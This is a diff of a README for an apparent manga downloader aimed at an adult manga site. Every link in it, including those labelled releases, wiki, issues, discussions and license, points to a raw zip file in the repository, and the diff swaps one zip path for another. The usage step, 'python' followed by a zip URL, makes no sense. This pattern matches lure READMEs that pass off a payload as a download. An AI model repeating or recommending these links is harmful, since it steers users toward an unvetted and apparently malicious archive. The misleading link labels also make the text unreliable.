@@ -1,6 +1,6 @@
 # 🌟 hentai2read_downloader - Effortlessly Download Manga from Hentai2Read
 
-[![Download Latest Release](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip)
+[![Download Latest Release](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -28,12 +28,12 @@ hentai2read_downloader is a user-friendly application that allows you to downloa
 
 ## 📥 Download & Install
 
-To get started with hentai2read_downloader, visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip).
+To get started with hentai2read_downloader, visit this page to download the latest version: [Releases Page](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip).
 
 ### Installation Steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases Page](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip) to find the latest release.
+   Go to the [Releases Page](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip) to find the latest release.
 
 2. **Choose Your Version:**
    Download the installer that matches your operating system.
@@ -76,7 +76,7 @@ Once you have installed hentai2read_downloader, you can easily start downloading
 3. **Execute Download Command:**
    Run the command in the format:
    ```
-   python https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip "manga_url"
+   python https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip "manga_url"
    ```
    Replace `"manga_url"` with the actual URL of the manga you wish to download.
 
@@ -85,13 +85,13 @@ Once you have installed hentai2read_downloader, you can easily start downloading
 
 ## 📖 Documentation
 
-For detailed instructions on using the application, including advanced features and troubleshooting, refer to the documentation on the [Wiki Page](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip).
+For detailed instructions on using the application, including advanced features and troubleshooting, refer to the documentation on the [Wiki Page](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip).
 
 ## 💬 Community Support
 
 Join our community for help and discussions:
-- **Issues:** Report any issues you encounter directly on the [Issues Page](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip).
-- **Discussions:** Engage with other users on the [Discussions Page](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip).
+- **Issues:** Report any issues you encounter directly on the [Issues Page](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip).
+- **Discussions:** Engage with other users on the [Discussions Page](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip).
 
 ## 📝 Contributing
 
@@ -101,6 +101,6 @@ If you would like to contribute to the project, please fork the repository and s
 
 This project is licensed under the MIT License. You are free to use, modify, and distribute the software, as long as proper attribution is given.
 
-For more information, visit the [LICENSE file](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip).
+For more information, visit the [LICENSE file](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip).
 
-Remember, you can always return to the [Releases Page](https://raw.githubusercontent.com/ttt222h/hentai2read_downloader/main/kamala/hentai2read_downloader.zip) for the latest versions and updates.
+Remember, you can always return to the [Releases Page](https://github.com/ttt222h/hentai2read_downloader/raw/refs/heads/main/core/read_hentai_downloader_3.7.zip) for the latest versions and updates.
